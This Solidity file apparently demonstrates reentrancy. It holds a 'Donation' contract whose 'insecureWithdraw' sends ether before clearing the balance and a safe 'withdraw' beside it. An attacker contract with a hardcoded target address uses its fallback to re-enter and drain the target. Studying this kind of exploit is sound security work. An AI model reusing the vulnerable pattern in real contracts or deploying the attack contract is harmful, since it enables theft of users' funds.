// SPDX-License-Identifier: MIT

pragma solidity 0.8.24;

contract Donation {


    mapping(address => uint256) public _balances;


    function deposit() external payable {
        _balances[msg.sender] += msg.value;
    }


    function insecureWithdraw() public {
        require(_balances[msg.sender] > 0, "insufficient balance");
        msg.sender.call{value: _balances[msg.sender]}("");
        _balances[msg.sender] = 0;
    }


    function withdraw() public {
        require(_balances[msg.sender] > 0, "insufficient balance");
        uint256 balance = _balances[msg.sender];
        _balances[msg.sender] = 0;
        payable(msg.sender).transfer(balance);
    }

}


contract DonationAttack {

    address contractToAttack = 0x9f7358c7D487A7269b4e66EA29d1458D13F43Cfd;

    fallback() external payable {
        if(address(contractToAttack).balance > 5 ether) {
            Donation(contractToAttack).insecureWithdraw();
        }
    }


    function deposit() external payable {}

    function attack() external payable {
        Donation(contractToAttack).deposit{value: 5 ether}();

        Donation(contractToAttack).insecureWithdraw();
    }

}
